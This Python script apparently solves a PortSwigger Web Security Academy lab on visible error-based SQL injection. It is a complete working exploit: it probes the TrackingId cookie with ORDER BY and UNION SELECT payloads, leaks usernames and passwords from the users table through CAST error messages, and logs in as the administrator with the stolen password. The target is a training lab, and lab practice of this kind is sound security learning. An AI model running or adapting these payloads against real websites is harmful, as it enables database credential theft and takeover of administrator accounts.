import requests
import argparse
import re
import string

parser = argparse.ArgumentParser(description='Solves the following Lab: Visible error-based SQL injection')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
trackingid = r.cookies.get("TrackingId")
session = r.cookies.get("session")

# CHECK EXPLOITABLE COLUMNS
for i in range(27, 0, -1):
    headers = {'Cookie': f'TrackingId=\'ORDER BY {i}-- -; session={session}'}
    r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
    if r.status_code == 200:
        print(f"Exploitable columns: {i}")
        COLUMNS = i

# GENERATE DIAGONAL MATRIX WITH STRINGS
matrix = [["NULL"]*COLUMNS for _ in range(COLUMNS)]
for i in range(COLUMNS):
        matrix[i][i] = "SQLi"

# CHECK WHAT COLUMN STORES STRINGS
for i in range(COLUMNS):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {matrix[i]} FROM users-- -".replace("[", "").replace("]", "").replace("'NULL'", "NULL").replace('"',''))
    if r.status_code == 200:
        print(f"Column {i+1} holds string values:\nhttps://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {matrix[i]} FROM users-- -".replace("[", "").replace("]", "").replace("'NULL'", "NULL").replace('"',''))
    else:
         print("No exploitable column stores string values.")

# EXTRACT LAST USER
users = []
for i in range(27, 0, -1):
     headers = {'Cookie': f'TrackingId=\'||CAST((SELECT username FROM users OFFSET {i})AS INT)-- -; session={session}'}
     r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
     if r.status_code == 500:
        user = re.search(r'<h4>(.*?)</h4>', r.text).group(1)
        user = re.search(r'"([^"]*)"', user).group(1)
        users.append(user)
        break

# EXTRACT LAST PASSWORD
passwords = []
for i in range(27, 0, -1):
     headers = {'Cookie': f'TrackingId=\'||CAST((SELECT password FROM users OFFSET {i})AS INT)-- -; session={session}'}
     r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
     if r.status_code == 500:
        password = re.search(r'<h4>(.*?)</h4>', r.text).group(1)
        password = re.search(r'"([^"]*)"', password).group(1)
        passwords.append(password)
        break  

# EXTRACT FIRST USER
headers = {'Cookie': f'TrackingId=\'||CAST((SELECT username FROM users LIMIT 1)AS INT)-- -; session={session}'}
r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
user = re.search(r'<h4>(.*?)</h4>', r.text).group(1)
user = re.search(r'"([^"]*)"', user).group(1)
users.append(user)

# EXTRACT FIRST PASSWORD
headers = {'Cookie': f'TrackingId=\'||CAST((SELECT password FROM users LIMIT 1)AS INT)-- -; session={session}'}
r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
password = re.search(r'<h4>(.*?)</h4>', r.text).group(1)
password = re.search(r'"([^"]*)"', password).group(1)
passwords.append(password)

# PUT VALUES INSIDE DICT, PRINT LOOTED CREDENTIALS
credentials = {k: v for k, v in zip(users, passwords)}
print(credentials)

# LOGIN AS ADMINISTRATOR
data = {
'csrf': f'{csrf}',
'username': 'administrator',
'password': f'{credentials.get("administrator")}'
}
requests.post('https://' + lab.id + '.web-security-academy.net/login',headers=headers, data=data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
